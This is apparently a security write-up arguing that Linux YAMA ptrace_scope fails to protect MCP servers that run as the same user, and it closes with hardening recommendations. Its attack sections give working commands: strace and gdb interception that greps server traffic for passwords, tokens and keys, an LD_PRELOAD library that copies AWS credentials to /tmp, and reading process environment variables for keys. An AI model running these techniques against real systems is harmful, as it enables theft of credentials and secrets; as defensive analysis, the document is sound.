# YAMA ptrace_scope and MCP: Why Modern Security Controls Don't Help

## Linux Security Module (YAMA) Complications

### Ubuntu/Modern Linux Restrictions

> "Later Ubuntu versions ship with a Linux kernel configured to prevent ptrace attaches from processes other than the traced process' parent; this allows gdb and strace to continue to work when running a target process, but prevents them from attaching to an unrelated running process."

Control via `/proc/sys/kernel/yama/ptrace_scope`:

```bash
# Check current setting
cat /proc/sys/kernel/yama/ptrace_scope

# 0 = Classic ptrace permissions (permissive)
# 1 = Parent-child only (default on Ubuntu)
# 2 = Admin-only attach
# 3 = No attach at all
```

### Bypassing YAMA (May Require Root)

> "While some applications use prctl() to specifically disallow PTRACE_ATTACH (e.g. ssh-agent), a more general solution implemented in Yama is to only allow ptrace directly from a parent to a child process (i.e. direct gdb and strace still work), or as the root user."

## MCP-Specific Attack Scenarios

### Scenario 1: Same-User Attack (No Root Required)

**Common MCP Setup**:
```json
{
  "mcpServers": {
    "database": {
      "command": "python",
      "args": ["db-server.py"]
    }
  }
}
```

**Attack without root**:
```bash
# Find the MCP server process (running as same user)
ps aux | grep db-server.py

# Attach and intercept (no root needed)
strace -p <PID> -e trace=read,write -s 1024 2>&1 | grep -E "postgresql://"
```

### Why YAMA Doesn't Protect MCP

#### 1. Parent-Child Relationship Loophole

MCP servers are often started by:
- User's shell (making shell the parent)
- Claude Desktop (making Claude the parent)
- SystemD user service (making systemd --user the parent)

All running as the same user!

```bash
# Method 1: Launch wrapper that becomes parent
#!/bin/bash
# evil-wrapper.sh
python db-server.py &
MCP_PID=$!

# Now we're the parent - ptrace allowed!
gdb -p $MCP_PID
```

#### 2. Process Injection Without Ptrace

Even with ptrace_scope=1, same-user attacks work:

```bash
# LD_PRELOAD injection (no ptrace needed)
echo 'void _init() { system("cat ~/.aws/credentials > /tmp/stolen"); }' > evil.c
gcc -shared -fPIC evil.c -o evil.so

# Restart MCP with our library
killall db-server.py
LD_PRELOAD=./evil.so python db-server.py
```

#### 3. File Descriptor Hijacking

```bash
# Even without ptrace, we can access FDs
lsof -p $(pgrep db-server) | grep -E "PIPE|socket"

# Read from process memory via /proc
cat /proc/$(pgrep db-server)/environ | tr '\0' '\n' | grep -i key
```

### Scenario 2: Container Escape (YAMA Ineffective)

Containers often disable YAMA:

```yaml
# docker-compose.yml
services:
  mcp-server:
    image: mcp-oracle
    cap_add:
      - SYS_PTRACE  # Game over!
    security_opt:
      - apparmor:unconfined
```

### Scenario 3: Development Mode (YAMA Disabled)

Developers routinely disable YAMA:

```bash
# "I need to debug my MCP server"
sudo sysctl kernel.yama.ptrace_scope=0

# Now everything is vulnerable
```

## The YAMA Bypass Matrix

| ptrace_scope | Same User | Different User | Root | MCP Impact |
|--------------|-----------|----------------|------|------------|
| 0 (classic)  | ✅ Full   | ❌ Denied     | ✅   | Completely vulnerable |
| 1 (Ubuntu)   | ⚠️ Limited | ❌ Denied     | ✅   | Still vulnerable via workarounds |
| 2 (admin)    | ❌ Denied | ❌ Denied     | ✅   | Requires root compromise |
| 3 (none)     | ❌ Denied | ❌ Denied     | ❌   | Maximum security (breaks debugging) |

## Real Attack: Bypassing YAMA on Ubuntu 22.04

```bash
# Check YAMA setting
$ cat /proc/sys/kernel/yama/ptrace_scope
1  # Parent-child only

# Method 1: Become the parent
$ cat > mcp-interceptor.sh << 'EOF'
#!/bin/bash
# Launch MCP as our child
python /usr/bin/db-server.py &
MCP_PID=$!
echo "MCP started as PID $MCP_PID"

# Wait for startup
sleep 2

# Now we can trace our child!
strace -p $MCP_PID -e trace=read,write -s 1024 2>&1 | 
    tee /tmp/mcp-traffic.log | 
    grep -E "password|token|key" --color=always
EOF

$ chmod +x mcp-interceptor.sh
$ ./mcp-interceptor.sh

# Method 2: Use GDB's shell feature
$ gdb
(gdb) shell python /usr/bin/db-server.py &
(gdb) attach $!  # Attach to last background process
(gdb) catch syscall read write
(gdb) continue

# Method 3: SystemTap (if available)
$ sudo stap -e 'probe process("/usr/bin/python").syscall { 
    if (pid() == target()) printf("%s\n", argstr) 
}' -x $(pgrep db-server)
```

## Why MCP's Architecture Defeats Security Controls

### 1. Trust Model Mismatch
- **YAMA assumes**: Different users = different trust
- **MCP assumes**: Same machine = same trust  
- **Reality**: Same user = game over

### 2. Communication Method
- **Secure IPC**: Would use authenticated sockets
- **MCP uses**: STDIO pipes (inherited by children)
- **Result**: Parent-child trust exploited

### 3. Credential Exposure
- **Secure design**: Credentials in kernel keyring
- **MCP reality**: Credentials in process memory
- **Attack surface**: Massive

## The "But YAMA!" Excuse Debunked

**Vendor**: "We're secure because Ubuntu has YAMA!"

**Reality**:
1. Default setting (1) still allows parent-child tracing
2. Developers disable it for debugging
3. Containers often bypass it
4. Same-user attacks have many alternatives
5. It's a defense-in-depth measure, not primary security

## Recommendations

### For Users
1. **Don't rely on YAMA** - It's not designed for same-user protection
2. **Run MCP as different user** - But this breaks the architecture
3. **Use proper IPC** - Which MCP doesn't support
4. **Assume compromise** - If attacker has your UID, it's over

### For MCP Developers
1. **Stop using STDIO** - It's fundamentally insecure
2. **Implement real authentication** - Not process-based trust
3. **Use secure IPC** - Unix domain sockets with SO_PEERCRED
4. **Isolate properly** - Different UIDs, not just PIDs

### Scenario 2: Cross-User Attack (Root Required)

**Enterprise MCP Setup**:
```bash
# Claude Desktop runs as: user "alice"
# MCP server runs as: user "mcp-service"
```

**Attack requiring root**:
```bash
# This will fail without root due to different users
strace -p <MCP_PID>  # EPERM error

# Requires root or CAP_SYS_PTRACE
sudo strace -p <MCP_PID>
```

**But This Creates New Problems**:

1. **Privilege Escalation Target**:
   ```bash
   # MCP server running as different user becomes target
   # Any vuln in MCP = privilege escalation
   ```

2. **Communication Complexity**:
   ```bash
   # How does alice's Claude talk to mcp-service's server?
   # Usually: Shared group + world-writable pipes (WORSE!)
   ```

3. **The \"Secure\" Setup That Isn't**:
   ```bash
   # Common "enterprise" deployment
   $ ls -la /var/run/mcp/
   prwxrwxrwx 1 mcp-service mcp-users 0 Nov  1 10:00 mcp.sock
   
   # World writable socket! Anyone can connect!
   ```

## Conclusion

YAMA ptrace_scope is a valuable security control, but it's not designed to protect against same-user attacks. MCP's architecture of running everything as the same user makes YAMA restrictions largely irrelevant. 

The attack surface remains massive because:
- Parent-child relationships are easily manufactured
- Alternative attack methods don't need ptrace
- Developers routinely disable protections
- The fundamental trust model is broken

Even when properly configured with different users (requiring root for ptrace), MCP deployments often introduce worse vulnerabilities through inter-process communication mechanisms.

YAMA is like putting a better lock on a door with no walls. The security model is architecturally flawed.